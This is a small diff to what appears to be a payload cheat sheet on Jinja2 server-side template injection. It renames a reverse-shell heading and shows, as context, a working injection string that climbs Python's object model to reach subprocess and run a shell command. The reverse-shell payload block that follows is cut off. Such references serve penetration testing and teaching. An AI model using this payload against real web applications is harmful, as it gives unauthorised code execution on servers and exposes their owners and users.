@@ -137,7 +137,7 @@ The list ['ls', '-lah'] contains the command ls and its argument -lah. The comma
 {{"".__class__.__mro__[1].__subclasses__()[<index-of-subprocess.popen>].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
 ```
 
-## Jinja2 RCE to Bash Reverse Shell via subprocess.Popen
+## Reverse Shell via subprocess.Popen
 
 Reverse Shell Payload
 ```
